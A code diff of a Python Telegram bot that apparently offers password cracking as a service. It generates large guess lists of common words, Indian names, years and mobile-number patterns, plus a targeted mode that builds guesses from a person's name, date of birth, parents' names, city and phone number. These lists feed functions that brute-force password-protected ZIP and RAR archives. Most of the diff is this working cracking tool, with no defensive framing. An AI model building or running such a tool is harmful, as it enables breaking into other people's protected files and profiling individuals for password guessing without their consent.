@@ -1,3 +1,6 @@
+# ============================================================
+# PART 1: IMPORTS, CONFIG, SESSIONS, TELEGRAM HELPERS
+# ============================================================
 import os
 import json
 import time
@@ -12,289 +15,217 @@ from datetime import datetime
 
 TOKEN = os.environ.get("BOT_TOKEN")
 RENDER_URL = os.environ.get("RENDER_URL", "https://your-bot.onrender.com")
-PRIVATE_CHANNEL = -1004491770657
+PRIVATE_CHANNEL = -1001234567890
 CHANNEL_USERNAME = "@nrtecno2"
 
 app = Flask(__name__)
-
-# ============================================================
-# USER SESSION STORAGE
-# ============================================================
 user_sessions = {}
 
-# ============================================================
-# UNLIMITED PASSWORD GENERATOR (5 to 100 characters)
+def send_message(chat_id, text, reply_markup=None, parse_mode='Markdown'):
+    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
+    payload = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode}
+    if reply_markup:
+        payload["reply_markup"] = json.dumps(reply_markup)
+    requests.post(url, json=payload)
+
+def edit_message(chat_id, message_id, text, reply_markup=None, parse_mode='Markdown'):
+    url = f"https://api.telegram.org/bot{TOKEN}/editMessageText"
+    payload = {"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": parse_mode}
+    if reply_markup:
+        payload["reply_markup"] = json.dumps(reply_markup)
+    requests.post(url, json=payload)
+
+def send_document(chat_id, file_path, caption=""):
+    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
+    with open(file_path, 'rb') as f:
+        files = {'document': f}
+        data = {'chat_id': chat_id, 'caption': caption}
+        requests.post(url, files=files, data=data)
+
+def answer_callback(callback_id, text=""):
+    url = f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery"
+    payload = {"callback_query_id": callback_id, "text": text}
+    requests.post(url, json=payload)
+
+def check_channel_membership(user_id):
+    try:
+        url = f"https://api.telegram.org/bot{TOKEN}/getChatMember"
+        params = {"chat_id": CHANNEL_USERNAME, "user_id": user_id}
+        response = requests.get(url, params=params)
+        data = response.json()
+        if data["ok"]:
+            status = data["result"]["status"]
+            return status in ["member", "creator", "administrator"]
+        return False
+    except:
+        return False
+
+def get_auto_buttons():
+    return {
+        "inline_keyboard": [
+            [
+                {"text": "1️⃣ AUTO (With Info)", "callback_data": "auto_info"},
+                {"text": "2️⃣ AUTO (Direct)", "callback_data": "auto_direct"}
+            ]
+        ]
+    }
+
+def join_verify_keyboard():
+    return {
+        "inline_keyboard": [
+            [
+                {"text": "🔴 JOIN CHANNEL", "url": "https://t.me/nrtecno2"},
+                {"text": "✅ VERIFY", "callback_data": "verify"}
+            ]
+        ]
+    }# ============================================================
+# PART 2: UNLIMITED PASSWORD GENERATOR
 # ============================================================
 def generate_unlimited_passwords():
     """Generate passwords from 5 to 100 characters - UNLIMITED"""
     passwords = set()
-    
-    # Character sets
     lower = 'abcdefghijklmnopqrstuvwxyz'
     upper = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
     digits = '0123456789'
     special = '@#&%!$_-'
-    all_chars = lower + upper + digits + special
     
-    # Common names
-    common_names = [
-        'raj', 'rahul', 'amit', 'vikram', 'ajay', 'sunil', 'anil', 
-        'deepak', 'sanjay', 'vijay', 'arjun', 'karan', 'mohit', 
-        'rohit', 'ankit', 'vivek', 'manoj', 'suresh', 'mahesh', 
-        'ramesh', 'dinesh', 'ganesh', 'naveen', 'pawan', 'sachin',
-        'rajesh', 'kapil', 'narendra', 'mukesh', 'ravi', 'ashok',
-        'shyam', 'ghanshyam', 'kumar', 'singh', 'sharma', 'verma',
-        'gupta', 'yadav', 'jain', 'patel', 'shah', 'desai'
-    ]
+    # 1. BASIC PASSWORDS (admin, ADMIN, Admin, aDmIn)
+    base_words = ['admin', 'password', 'root', 'toor', 'user', 'guest', 'login', 'secret', 'private', 'public', 'default', 'changeme', 'welcome', 'hello', 'test', 'demo']
+    for word in base_words:
+        passwords.add(word); passwords.add(word.upper()); passwords.add(word.capitalize())
+        for _ in range(10):
+            mixed = ''.join(random.choice([c.upper(), c.lower()]) for c in word)
+            passwords.add(mixed)
+        for num in ['123', '456', '789', '2024', '2025']:
+            passwords.add(f"{word}{num}"); passwords.add(f"{word.upper()}{num}"); passwords.add(f"{word.capitalize()}{num}")
+        for spec in special:
+            passwords.add(f"{word}{spec}"); passwords.add(f"{word}{spec}{random.randint(10, 99)}"); passwords.add(f"{spec}{word}")
     
-    # Common words
-    common_words = [
-        'password', 'admin', 'root', 'toor', 'iloveyou', 'sunshine',
-        'princess', 'dragon', 'baseball', 'superman', 'batman',
-        'trustno', 'hello', 'freedom', 'whatever', 'qwerty',
-        'letmein', 'welcome', 'monkey', 'secret', 'love', 'angel',
-        'rainbow', 'tiger', 'eagle', 'phoenix', 'shadow', 'night',
-        'star', 'moon', 'sun', 'cloud', 'thunder', 'lightning'
-    ]
+    # 2. NAMES WITH GAPS (Narendra Kumar Meghwal)
+    common_names = ['raj','rahul','amit','vikram','ajay','sunil','anil','deepak','sanjay','vijay','arjun','karan','mohit','rohit','ankit','vivek','manoj','suresh','mahesh','ramesh','dinesh','ganesh','naveen','pawan','sachin','rajesh','kapil','narendra','mukesh','ravi','ashok','shyam','ghanshyam','kumar','singh','sharma','verma','gupta','yadav','jain','patel','shah','desai','meghwal']
+    for name in common_names[:20]:
+        for surname in common_names[:15]:
+            if name != surname:
+                passwords.add(f"{name} {surname}")
+                passwords.add(f"{name} {surname} {random.randint(10, 99)}")
+                passwords.add(f"{name} {surname}@{random.randint(10, 99)}")
+                passwords.add(f"{name.capitalize()} {surname.capitalize()}")
+                passwords.add(f"{name.upper()} {surname.upper()}")
+                passwords.add(f"{name}{surname}")
+    for n1 in common_names[:10]:
+        for n2 in common_names[:8]:
+            for n3 in common_names[:5]:
+                if n1 != n2 and n2 != n3:
+                    passwords.add(f"{n1} {n2} {n3}")
+                    passwords.add(f"{n1.capitalize()} {n2.capitalize()} {n3.capitalize()}")
+                    passwords.add(f"{n1.upper()} {n2.upper()} {n3.upper()}")
+                    passwords.add(f"{n1}{n2}{n3}")
     
-    numbers = ['1', '12', '123', '1234', '12345', '123456', '1234567', '12345678', '123456789', '1234567890']
-    years = ['2020', '2021', '2022', '2023', '2024', '2025', '2026', '2027', '2028', '2029', '2030']
+    # 3. MIXED PASSWORDS
+    common_words = ['password','admin','root','toor','iloveyou','sunshine','princess','dragon','baseball','superman','batman','trustno','hello','freedom','whatever','qwerty','letmein','welcome','monkey','secret','love','angel','rainbow','tiger','eagle','phoenix','shadow','night','star','moon','sun','cloud','thunder','lightning']
+    for w1 in common_words[:15]:
+        for w2 in common_words[:10]:
+            if w1 != w2:
+                passwords.add(f"{w1} {w2}")
+                passwords.add(f"{w1.capitalize()} {w2.capitalize()}")
+                passwords.add(f"{w1.upper()} {w2.upper()}")
+                passwords.add(f"{w1} {w2} {random.randint(10, 99)}")
+                passwords.add(f"{w1}{w2}")
+    for name in common_names[:15]:
+        for word in common_words[:10]:
+            passwords.add(f"{name} {word}")
+            passwords.add(f"{name} {word} {random.randint(10, 99)}")
+            passwords.add(f"{name}{word}")
+            passwords.add(f"{name.capitalize()} {word.capitalize()}")
+            passwords.add(f"{name.upper()} {word.upper()}")
+            for spec in ['@','#','&','%']:
+                passwords.add(f"{name}{spec}{word}")
+                passwords.add(f"{name}{spec}{word}{random.randint(10, 99)}")
     
-    # ========== 1. NAME + NUMBER COMBINATIONS ==========
-    for name in common_names:
-        for num in numbers[:8]:
-            passwords.add(f"{name}{num}")
-            passwords.add(f"{name}@{num}")
-            passwords.add(f"{name}#{num}")
-            passwords.add(f"{name}{num}@")
-            passwords.add(f"{name}{num}#")
-            passwords.add(f"{name.capitalize()}{num}")
-            passwords.add(f"{name}{num}!")
-            passwords.add(f"{name}!{num}")
-            passwords.add(f"{name}_{num}")
-            passwords.add(f"{name}-{num}")
-            passwords.add(f"{name}{num}{random.randint(10, 99)}")
+    # 4. BRAND VARIATIONS (Password by Nrtecno)
+    brand_variations = ["Password by Nrtecno", "PASSWORD BY NRTECNO", "Password By Nrtecno", "password by nrtecno", "Nrtecno Password", "NRTECNO PASSWORD", "Nrtecno@2024", "Nrtecno#2025", "Nrtecno%2026", "Nrtecno Password 2024", "NRTECNO@2024", "Nrtecno_2024"]
+    for var in brand_variations:
+        passwords.add(var)
+        for num in ['123', '456', '789', '2024', '2025']:
+            passwords.add(f"{var}{num}")
+            passwords.add(f"{var}@{num}")
+            passwords.add(f"{var}#{num}")
     
-    # ========== 2. WORD + NUMBER COMBINATIONS ==========
-    for word in common_words:
-        for num in numbers[:8]:
-            passwords.add(f"{word}{num}")
-            passwords.add(f"{word}@{num}")
-            passwords.add(f"{word}#{num}")
-            passwords.add(f"{word}{num}@")
-            passwords.add(f"{word}{num}#")
-            passwords.add(f"{word.capitalize()}{num}")
-            passwords.add(f"{word}{num}!")
-            passwords.add(f"{word}!{num}")
-            passwords.add(f"{word}_{num}")
-            passwords.add(f"{word}-{num}")
-    
-    # ========== 3. NAME + YEAR ==========
-    for name in common_names[:30]:
+    # 5. YEARS + NAME + ALL CASE VARIATIONS
+    years = ['2020','2021','2022','2023','2024','2025','2026']
+    for name in common_names[:20]:
         for year in years:
             passwords.add(f"{name}{year}")
+            passwords.add(f"{name.capitalize()}{year}")
+            passwords.add(f"{name.upper()}{year}")
+            passwords.add(f"{name} {year}")
             passwords.add(f"{name}@{year}")
             passwords.add(f"{name}#{year}")
-            passwords.add(f"{name}{year}!")
-            passwords.add(f"{name}!{year}")
-            passwords.add(f"{name.capitalize()}{year}")
     
-    # ========== 4. WORD + YEAR ==========
-    for word in common_words[:20]:
-        for year in years:
-            passwords.add(f"{word}{year}")
-            passwords.add(f"{word}@{year}")
-            passwords.add(f"{word}#{year}")
-            passwords.add(f"{word}{year}!")
-            passwords.add(f"{word}!{year}")
+    # 6. MOBILE NUMBER COMBINATIONS
+    mobile_patterns = ["9876543210", "987654321", "876543210", "76543210", "1234567890", "987654", "123456"]
+    for mobile in mobile_patterns:
+        passwords.add(mobile)
+        for name in common_names[:10]:
+            passwords.add(f"{name}{mobile}")
+            passwords.add(f"{name}{mobile[-4:]}")
+            passwords.add(f"{name} {mobile}")
+            passwords.add(f"{name}@{mobile}")
     
-    # ========== 5. NAME + WORD COMBINATIONS ==========
-    for name in common_names[:20]:
-        for word in common_words[:15]:
-            passwords.add(f"{name}{word}")
-            passwords.add(f"{name}@{word}")
-            passwords.add(f"{name}#{word}")
-            passwords.add(f"{name}{word}{random.randint(1, 99)}")
-            passwords.add(f"{name.capitalize()}{word.capitalize()}")
-            passwords.add(f"{name}{word}@")
-            passwords.add(f"{name}{word}#")
-    
-    # ========== 6. NUMERIC COMBINATIONS ==========
-    # 4 to 20 digit numbers
-    for length in range(4, 21):
-        # Common starting patterns
-        for start in ['1', '2', '3', '4', '5', '6', '7', '8', '9']:
-            for _ in range(50):  # Limit for each length
-                num = start
-                for __ in range(length - 1):
-                    num += str(random.randint(0, 9))
-                passwords.add(num)
-        
-        # All same digits
-        for d in '0123456789':
-            passwords.add(d * length)
-        
-        # Sequential
-        seq = ''
-        for i in range(length):
-            seq += str(i % 10)
-        passwords.add(seq)
-        
-        # Reverse sequential
-        rev_seq = ''
-        for i in range(length):
-            rev_seq += str((i % 10))
-        passwords.add(rev_seq[::-1])
-    
-    # ========== 7. ALPHABET COMBINATIONS ==========
-    # 5 to 15 character alphabet combinations
-    for length in range(5, 16):
-        # Common prefixes
-        for prefix in ['a', 'b', 'c', 'q', 'p', 'z', 'x', 'm', 'n', 's']:
-            base = prefix * length
-            passwords.add(base)
-            passwords.add(base.capitalize())
-            # Add numbers
-            for num in ['123', '456', '789', '2024']:
-                if len(base) >= len(num):
-                    passwords.add(f"{base[:length-len(num)]}{num}")
-                    passwords.add(f"{base[:length-len(num)]}@{num}")
-                    passwords.add(f"{base[:length-len(num)]}#{num}")
-        
-        # Random combinations
-        for _ in range(100):
-            word = ''.join(random.choices(lower, k=length))
-            passwords.add(word)
-            passwords.add(word.capitalize())
-            passwords.add(word + str(random.randint(10, 99)))
-            passwords.add(word + '@' + str(random.randint(10, 99)))
-    
-    # ========== 8. SPECIAL CHARACTER COMBINATIONS ==========
-    for length in range(5, 21):
-        for _ in range(50):
-            # Mix of letters + numbers + special
-            chars = random.choices(lower + digits, k=length-2)
-            chars.append(random.choice(special))
-            chars.append(str(random.randint(0, 9)))
-            random.shuffle(chars)
-            passwords.add(''.join(chars))
-            
-            # Capital + small + number + special
-            chars = []
-            chars.append(random.choice(upper))
-            for __ in range(length-4):
-                chars.append(random.choice(lower + digits))
-            chars.append(random.choice(special))
-            chars.append(str(random.randint(0, 9)))
-            random.shuffle(chars)
-            passwords.add(''.join(chars))
-    
-    # ========== 9. LONG PASSWORDS (30 to 100 chars) ==========
-    long_patterns = [
-        "abcdefghijklmnopqrstuvwxyz",
-        "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
-        "0123456789",
-        "qwertyuiopasdfghjklzxcvbnm",
-        "thequickbrownfoxjumpsoverthelazydog",
-        "packmyboxwithfivedozenliquorjugs",
-        "howvexinglyquickdafoxjumpsoverthelazydog",
-        "thefiveboxingwizardsjumpquickly",
-        "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
-        "0123456789abcdefghijklmnopqrstuvwxyz"
-    ]
-    
+    # 7. LONG PASSWORDS (30 to 100 chars)
+    long_patterns = ["abcdefghijklmnopqrstuvwxyz", "ABCDEFGHIJKLMNOPQRSTUVWXYZ", "0123456789", "qwertyuiopasdfghjklzxcvbnm", "thequickbrownfoxjumpsoverthelazydog", "packmyboxwithfivedozenliquorjugs", "howvexinglyquickdafoxjumpsoverthelazydog", "thefiveboxingwizardsjumpquickly"]
     for pattern in long_patterns:
         for length in range(30, 101):
             if len(pattern) >= length:
                 base = pattern[:length]
                 passwords.add(base)
-                # Add numbers
-                for num in ['123', '456', '789', '123456', '2024']:
+                for pos in range(10, min(len(base), 50), 10):
+                    if pos < len(base):
+                        passwords.add(base[:pos] + " " + base[pos:])
+                        passwords.add(base[:pos] + "@" + base[pos:])
+                for num in ['123', '456', '789', '2024']:
                     if len(base) >= len(num) + 3:
                         pwd = f"{base[:length-len(num)-1]}{num}{random.choice(special)}"
                         passwords.add(pwd)
-                        pwd2 = f"{base[:length-len(num)-1]}{random.choice(special)}{num}"
-                        passwords.add(pwd2)
+                        if len(pwd) > 20:
+                            pos = random.randint(10, len(pwd)-10)
+                            passwords.add(pwd[:pos] + " " + pwd[pos:])
     
-    # ========== 10. WORDLIST + SPECIAL COMBOS ==========
-    for word in common_words:
-        # Add special chars at different positions
-        for spec in special:
-            for num in numbers[:5]:
-                passwords.add(f"{word}{spec}{num}")
-                passwords.add(f"{word}{num}{spec}")
-                passwords.add(f"{spec}{word}{num}")
-                passwords.add(f"{word}{spec}{num}{spec}")
+    # 8. ALL CASE VARIATIONS FOR COMMON WORDS
+    all_words = common_names + common_words + base_words
+    for word in all_words[:50]:
+        for _ in range(8):
+            mixed = ''.join(random.choice([c.upper(), c.lower()]) for c in word)
+            passwords.add(mixed)
+            for num in ['123', '456', '789']:
+                passwords.add(f"{mixed}{num}")
+                passwords.add(f"{mixed}@{num}")
     
-    # ========== 11. SOCIAL MEDIA PATTERNS ==========
-    social_patterns = [
-        'instagram', 'facebook', 'whatsapp', 'telegram', 'twitter',
-        'snapchat', 'youtube', 'google', 'microsoft', 'apple',
-        'amazon', 'netflix', 'spotify', 'reddit', 'discord'
-    ]
+    # 9. SOCIAL MEDIA STYLE
+    social = ["instagram", "facebook", "twitter", "telegram", "whatsapp", "snapchat", "youtube", "reddit", "discord", "spotify"]
+    for s in social:
+        for word in common_words[:10]:
+            passwords.add(f"{s}_{word}")
+            passwords.add(f"{s}_{word}{random.randint(10, 99)}")
+            passwords.add(f"{s.upper()}_{word.upper()}")
     
-    for pattern in social_patterns:
-        for num in numbers[:5]:
-            passwords.add(f"{pattern}{num}")
-            passwords.add(f"{pattern}@{num}")
-            passwords.add(f"{pattern}#{num}")
-            passwords.add(f"{pattern}{num}!")
-            passwords.add(f"{pattern.capitalize()}{num}")
-    
-    # ========== 12. DATE BASED ==========
-    months = ['01', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12']
-    days = ['01', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21', '22', '23', '24', '25', '26', '27', '28']
-    
-    for name in common_names[:20]:
-        for m in months[:6]:
-            for d in days[:10]:
-                passwords.add(f"{name}{d}{m}")
-                passwords.add(f"{name}@{d}{m}")
-                passwords.add(f"{name}{d}{m}{random.randint(10, 99)}")
-                passwords.add(f"{name}{d}-{m}")
-                passwords.add(f"{name}_{d}{m}")
-    
-    # ========== 13. 100 CHARACTER PASSWORDS ==========
-    base_long = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#&%!$_-"
-    for _ in range(100):
-        pwd = ''.join(random.choices(base_long, k=100))
-        passwords.add(pwd)
-        # Add variation with specific patterns
-        for pattern in ['123', 'abc', 'xyz', 'qwerty']:
-            for i in range(0, 90, 10):
-                pwd_list = list(pwd)
-                pwd_list[i:i+len(pattern)] = pattern
-                passwords.add(''.join(pwd_list))
-    
-    # Remove duplicates and limit to avoid memory crash
     passwords = list(passwords)
     random.shuffle(passwords)
-    
-    print(f"✅ Generated {len(passwords)} unlimited passwords (5 to 100 chars)")
+    print(f"✅ Generated {len(passwords)} unlimited passwords")
     return passwords
-
-# ============================================================
-# SMART PASSWORD GENERATOR CLASS (For INFO mode)
+    # ============================================================
+# PART 3: SMART PASSWORD GENERATOR (INFO MODE)
 # ============================================================
 class SmartPasswordGenerator:
     def __init__(self, info=None):
         self.info = info or {}
-        self.common_words = [
-            'password', 'admin', 'root', 'toor', 'iloveyou', 'sunshine',
-            'princess', 'dragon', 'baseball', 'superman', 'batman',
-            'trustno', 'hello', 'freedom', 'whatever', 'qwerty',
-            'letmein', 'welcome', 'monkey', 'secret', 'love', 'angel',
-            'rainbow', 'tiger', 'eagle', 'phoenix', 'shadow', 'night',
-            'star', 'moon', 'sun', 'cloud', 'thunder', 'lightning'
-        ]
+        self.common_words = ['password','admin','root','toor','iloveyou','sunshine','princess','dragon','baseball','superman','batman','trustno','hello','freedom','whatever','qwerty','letmein','welcome','monkey','secret','love','angel','rainbow','tiger','eagle','phoenix','shadow','night','star','moon','sun','cloud','thunder','lightning']
         self.special_chars = ['@', '#', '&', '%', '!', '$', '_', '-']
-        self.numbers = ['1', '12', '123', '1234', '12345', '123456', '1234567', '12345678', '123456789', '1234567890']
-        self.years = ['2020', '2021', '2022', '2023', '2024', '2025', '2026', '2027', '2028', '2029', '2030']
+        self.numbers = ['1','12','123','1234','12345','123456','1234567','12345678','123456789','1234567890']
+        self.years = ['2020','2021','2022','2023','2024','2025','2026']
     
     def generate_from_info(self):
-        """Generate passwords using user info"""
         passwords = set()
-        
         name = self.info.get('name', '').strip().lower()
         dob = self.info.get('dob', '').strip()
         father = self.info.get('father', '').strip().lower()
@@ -302,7 +233,6 @@ class SmartPasswordGenerator:
         city = self.info.get('city', '').strip().lower()
         mobile = self.info.get('mobile', '').strip()
         
-        # Extract year from DOB
         year = ''
         if dob:
             if '/' in dob:
@@ -314,166 +244,131 @@ class SmartPasswordGenerator:
                 if len(parts) == 3:
                     year = parts[-1]
         
-        info_pieces = [name, father, mother, city]
-        info_pieces = [p for p in info_pieces if p]
+        info_pieces = [p for p in [name, father, mother, city] if p]
         
-        # 1. Name + Number combinations
+        # 1. Name variations (admin, ADMIN, Admin, aDmIn)
         for p in info_pieces:
             if p:
-                for num in self.numbers[:8]:
-                    passwords.add(f"{p}{num}")
-                    passwords.add(f"{p}@{num}")
-                    passwords.add(f"{p}#{num}")
-                    passwords.add(f"{p}{num}@")
-                    passwords.add(f"{p}{num}#")
-                    passwords.add(f"{p.capitalize()}{num}")
-                    passwords.add(f"{p}{num}!")
-                    passwords.add(f"{p}!{num}")
-                    passwords.add(f"{p}_{num}")
+                passwords.add(p); passwords.add(p.upper()); passwords.add(p.capitalize())
+                for _ in range(10):
+                    mixed = ''.join(random.choice([c.upper(), c.lower()]) for c in p)
+                    passwords.add(mixed)
+                for num in self.numbers[:5]:
+                    passwords.add(f"{p}{num}"); passwords.add(f"{p.upper()}{num}"); passwords.add(f"{p.capitalize()}{num}")
+                    passwords.add(f"{p} {num}")
+                for spec in self.special_chars:
+                    passwords.add(f"{p}{spec}"); passwords.add(f"{spec}{p}")
+                    passwords.add(f"{p}{spec}{random.randint(10, 99)}")
         
-        # 2. Name + Year
-        for p in info_pieces:
-            if p:
-                for y in self.years[:8]:
-                    passwords.add(f"{p}{y}")
-                    passwords.add(f"{p}@{y}")
-                    passwords.add(f"{p}#{y}")
-                    passwords.add(f"{p}{y}!")
-                    passwords.add(f"{p.capitalize()}{y}")
-        
-        # 3. Name + Name combinations
+        # 2. Name + Name (Narendra Kumar Meghwal style)
         for p1 in info_pieces:
             for p2 in info_pieces:
                 if p1 != p2:
+                    passwords.add(f"{p1} {p2}")
+                    passwords.add(f"{p1.capitalize()} {p2.capitalize()}")
+                    passwords.add(f"{p1.upper()} {p2.upper()}")
                     passwords.add(f"{p1}{p2}")
-                    passwords.add(f"{p1}@{p2}")
-                    passwords.add(f"{p1}#{p2}")
-                    passwords.add(f"{p1}{p2}{random.randint(1, 99)}")
-                    passwords.add(f"{p1.capitalize()}{p2.capitalize()}")
+                    for num in self.numbers[:3]:
+                        passwords.add(f"{p1} {p2} {num}")
+                        passwords.add(f"{p1}{p2}{num}")
+                    for spec in self.special_chars:
+                        passwords.add(f"{p1}{spec}{p2}")
+                        passwords.add(f"{p1} {spec} {p2}")
         
-        # 4. Mobile number combinations
+        # 3. Name + Year
+        for p in info_pieces:
+            if p:
+                for y in self.years[:8]:
+                    passwords.add(f"{p}{y}"); passwords.add(f"{p.capitalize()}{y}"); passwords.add(f"{p.upper()}{y}")
+                    passwords.add(f"{p} {y}"); passwords.add(f"{p}@{y}"); passwords.add(f"{p}#{y}")
+        
+        # 4. Name + Common Word
+        for p in info_pieces:
+            if p:
+                for word in self.common_words[:10]:
+                    passwords.add(f"{p} {word}")
+                    passwords.add(f"{p.capitalize()} {word.capitalize()}")
+                    passwords.add(f"{p}{word}")
+                    for num in self.numbers[:3]:
+                        passwords.add(f"{p} {word} {num}")
+                        passwords.add(f"{p}{word}{num}")
+                        passwords.add(f"{p} {word}@{num}")
+                    for spec in self.special_chars:
+                        passwords.add(f"{p}{spec}{word}")
+                        passwords.add(f"{p} {spec} {word}")
+        
+        # 5. Password by Nrtecno style
+        brand = "Nrtecno"
+        for p in info_pieces:
+            if p:
+                passwords.add(f"Password by {p}")
+                passwords.add(f"PASSWORD BY {p.upper()}")
+                passwords.add(f"{p} Password")
+                passwords.add(f"{brand} {p}")
+                passwords.add(f"{brand}@{p}")
+                for num in self.numbers[:3]:
+                    passwords.add(f"{p} {brand} {num}")
+                    passwords.add(f"{p}{brand}{num}")
+        
+        # 6. Mobile combinations
         if mobile:
             mobile_clean = ''.join(filter(str.isdigit, mobile))
             if mobile_clean:
                 for i in range(2, len(mobile_clean) + 1):
-                    passwords.add(mobile_clean[:i])
-                    passwords.add(mobile_clean[-i:])
+                    passwords.add(mobile_clean[:i]); passwords.add(mobile_clean[-i:])
                     for p in info_pieces:
                         if p:
                             passwords.add(f"{p}{mobile_clean[:i]}")
+                            passwords.add(f"{p} {mobile_clean[:i]}")
                             passwords.add(f"{p}@{mobile_clean[:i]}")
                             passwords.add(f"{p}{mobile_clean[-i:]}")
-                            passwords.add(f"{p}@{mobile_clean[-i:]}")
-                            passwords.add(f"{p}{mobile_clean[:i]}{random.randint(1, 99)}")
         
-        # 5. Date of birth combinations
+        # 7. DOB combinations
         if dob:
             clean_dob = dob.replace('/', '').replace('-', '')
             if len(clean_dob) >= 4:
-                passwords.add(clean_dob)
-                passwords.add(clean_dob[-4:])
+                passwords.add(clean_dob); passwords.add(clean_dob[-4:])
                 for p in info_pieces:
                     if p:
                         passwords.add(f"{p}{clean_dob}")
-                        passwords.add(f"{p}@{clean_dob}")
+                        passwords.add(f"{p} {clean_dob}")
                         passwords.add(f"{p}{clean_dob[-4:]}")
-                        passwords.add(f"{p}@{clean_dob[-4:]}")
+                        passwords.add(f"{p}@{clean_dob}")
         
-        # 6. Name + Common Words
-        for p in info_pieces:
-            if p:
-                for word in self.common_words[:15]:
-                    passwords.add(f"{p}{word}")
-                    passwords.add(f"{p}@{word}")
-                    passwords.add(f"{p}#{word}")
-                    passwords.add(f"{p}{word}{random.randint(1, 99)}")
-                    passwords.add(f"{p.capitalize()}{word.capitalize()}")
+        # 8. Three piece combinations
+        for p1 in info_pieces:
+            for p2 in info_pieces:
+                if p1 != p2:
+                    for p3 in info_pieces:
+                        if p3 != p1 and p3 != p2:
+                            passwords.add(f"{p1} {p2} {p3}")
+                            passwords.add(f"{p1.capitalize()} {p2.capitalize()} {p3.capitalize()}")
+                            passwords.add(f"{p1}{p2}{p3}")
+                            for num in self.numbers[:2]:
+                                passwords.add(f"{p1} {p2} {p3} {num}")
+                                passwords.add(f"{p1}{p2}{p3}{num}")
         
-        # 7. Long passwords (30 to 100 chars) from info
+        # 9. Long passwords from info
         for p in info_pieces:
             if p and len(p) >= 3:
                 for length in range(30, 101):
                     base = (p * (length // len(p) + 1))[:length]
-                    passwords.add(base)
-                    for num in ['123', '456', '789', '2024', '2025']:
+                    passwords.add(base); passwords.add(base.capitalize()); passwords.add(base.upper())
+                    for pos in range(10, min(len(base), 60), 15):
+                        if pos < len(base):
+                            passwords.add(base[:pos] + " " + base[pos:])
+                            passwords.add(base[:pos] + "@" + base[pos:])
+                    for num in ['123', '456', '789']:
                         if len(base) >= len(num) + 3:
                             pwd = f"{base[:length-len(num)-1]}{num}@{random.randint(1, 9)}"
                             passwords.add(pwd)
-                            pwd2 = f"{base[:length-len(num)-1]}{random.choice(self.special_chars)}{num}"
-                            passwords.add(pwd2)
-        
-        # 8. Info + Special combinations
-        for p in info_pieces:
-            if p:
-                for spec in self.special_chars:
-                    for num in self.numbers[:5]:
-                        passwords.add(f"{p}{spec}{num}")
-                        passwords.add(f"{p}{num}{spec}")
-                        passwords.add(f"{spec}{p}{num}")
-                        passwords.add(f"{p}{spec}{num}{spec}")
+                            if len(pwd) > 20:
+                                pos = random.randint(10, len(pwd)-10)
+                                passwords.add(pwd[:pos] + " " + pwd[pos:])
         
         return list(passwords)
-    
-    def generate_smart_passwords(self, count=10000):
-        """Generate common passwords without info"""
-        passwords = set()
-        
-        for word in self.common_words:
-            for num in self.numbers[:8]:
-                passwords.add(f"{word}{num}")
-                passwords.add(f"{word}@{num}")
-                passwords.add(f"{word}#{num}")
-                passwords.add(f"{word}{num}@")
-                passwords.add(f"{word}{num}#")
-                passwords.add(f"{word.capitalize()}{num}")
-                passwords.add(f"{word}{num}!")
-                passwords.add(f"{word}!{num}")
-        
-        for num in self.numbers:
-            passwords.add(num)
-            for num2 in self.numbers[:5]:
-                passwords.add(f"{num}{num2}")
-                passwords.add(f"{num}@{num2}")
-                passwords.add(f"{num}#{num2}")
-        
-        common_patterns = [
-            '123456', 'password', 'admin', '1234', '0000', 'qwerty',
-            'abc123', 'letmein', 'welcome', 'monkey', '123456789',
-            '987654321', 'password123', 'admin123', 'root', 'toor',
-            'iloveyou', 'sunshine', 'princess', 'dragon', 'baseball',
-            'superman', 'batman', 'trustno1', 'hello', 'freedom'
-        ]
-        
-        for p in common_patterns:
-            passwords.add(p)
-            for num in self.numbers[:5]:
-                passwords.add(f"{p}{num}")
-                passwords.add(f"{p}@{num}")
-                passwords.add(f"{p}#{num}")
-                passwords.add(f"{p}{num}@")
-                passwords.add(f"{p}{num}#")
-        
-        # Add long passwords
-        long_patterns = [
-            "abcdefghijklmnopqrstuvwxyz",
-            "qwertyuiopasdfghjklzxcvbnm",
-            "thequickbrownfoxjumpsoverthelazydog"
-        ]
-        
-        for pattern in long_patterns:
-            for length in range(30, 101):
-                if len(pattern) >= length:
-                    base = pattern[:length]
-                    passwords.add(base)
-                    for num in ['123', '456', '789']:
-                        if len(base) >= len(num) + 2:
-                            passwords.add(f"{base[:length-len(num)]}{num}")
-                            passwords.add(f"{base[:length-len(num)]}@{num}")
-        
-        return list(passwords)[:count]
-
-# ============================================================
-# FILE CRACKERS
+        # ============================================================
+# PART 4: FILE CRACKERS
 # ============================================================
 def crack_zip(file_path, password_list):
     for pwd in password_list:
@@ -546,77 +441,8 @@ def crack_file(file_path, ext, password_list):
     elif ext == 'rar':
         return crack_rar(file_path, password_list)
     return None
-
-# ============================================================
-# TELEGRAM HELPERS
-# ============================================================
-def send_message(chat_id, text, reply_markup=None, parse_mode='Markdown'):
-    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
-    payload = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode}
-    if reply_markup:
-        payload["reply_markup"] = json.dumps(reply_markup)
-    requests.post(url, json=payload)
-
-def edit_message(chat_id, message_id, text, reply_markup=None, parse_mode='Markdown'):
-    url = f"https://api.telegram.org/bot{TOKEN}/editMessageText"
-    payload = {"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": parse_mode}
-    if reply_markup:
-        payload["reply_markup"] = json.dumps(reply_markup)
-    requests.post(url, json=payload)
-
-def send_document(chat_id, file_path, caption=""):
-    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
-    with open(file_path, 'rb') as f:
-        files = {'document': f}
-        data = {'chat_id': chat_id, 'caption': caption}
-        requests.post(url, files=files, data=data)
-
-def answer_callback(callback_id, text=""):
-    url = f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery"
